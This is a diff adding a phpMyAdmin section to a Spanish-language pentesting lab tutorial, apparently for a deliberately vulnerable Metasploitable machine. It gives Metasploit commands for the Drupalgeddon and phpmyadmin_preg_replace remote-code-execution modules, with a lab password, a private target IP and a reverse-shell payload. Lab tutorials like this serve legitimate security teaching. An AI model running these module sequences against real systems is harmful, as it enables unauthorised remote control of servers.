@@ -77,3 +77,23 @@ msf exploit(multi/http/drupal_drupageddon) > exploit
 El proceso es el siguiente:  Abrimos la terminal de metasploit, y seleccionamos `exploit/multi/http/drupal_drupageddon` mediante el comando `use`. Seleccionamos la IP del dispositivo con el que vamos a hacer pentesting, en este caso `192.168.1.136`. Luego, al atributo `targeturi` le asigno el directorio `drupal/`, para posteriormente asignar la payload `php/reverse_perl`. Esto último es opcional, ya que por defecto se selecciona automáticamente el programa meterpreter en su versión de PHP, pero escogemos este otro payload que permite conectarnos directamente a la consola. Por último usamos `exploit` para iniciar el ataque.
 
 Al ejecutarlo, si sale bien estaremos en la consola de Ubuntu de forma remota como si fuera una shell normal, estando probablemente logueados como el usuario `www-data`.
+
+### phpMyAdmin
+phpMyAdmin es una herramienta con interfaz en web de administración gratuita y de código abierto para bases de datos MySQL y MariaDB. Está escrita en su mayoría en PHP, y proporciona la posibilidad de poner manejar bases de datos con sus tablas, columnas, relaciones, índices, usuarios, etc.
+
+Al igual que con el resto de ejemplos, en esta versión existe una vulnerabilidad que permite la ejecución de código de forma remota. Para ello, haremos uso del módulo `exploit/multi/http/phpmyadmin_preg_replace`. Para hacer uso de él, necesitaremos saber la contraseña de un usuario de phpMyAdmin y la dirección IP del equipo a atacar.
+
+Los pasos para realizar el exploit son los siguientes:
+
+```
+msf > use exploit/multi/http/phpmyadmin_preg_replace
+msf exploit(multi/http/phpmyadmin_preg_replace) > set password sploitme
+password => sploitme
+msf exploit(multi/http/phpmyadmin_preg_replace) > set rhosts 192.168.1.136
+rhosts => 192.168.1.136
+msf exploit(multi/http/phpmyadmin_preg_replace) > exploit
+```
+
+El proceso es el siguiente:  Abrimos la terminal de metasploit, y seleccionamos `exploit/multi/http/phpmyadmin_preg_replace` mediante el comando `use`. Ahora, asignaremos la contraseña con la cual loggearse dentro de phpMyAdmin bajo el usuario root, usando el comando `set password sploitme`. Tras esto, indicamos la IP de la estación que queremos atacar, por ejemplo `192.168.1.136`. Y ahora, no hace falta hacer nada más que ejecutar el comando `exploit` para iniciar el ataque.
+
+Con esto estaremos controlando remotamente el dispositivo con dicha IP, posiblemente bajo el usuario de `www-data`. Cabe destacar que el control es a través de meterpreter, pues es el de por defecto. Sin embargo, ya sabemos que podemos cambiar el payload si queremos con el comando `set payload [PAYLOAD A USAR]`.
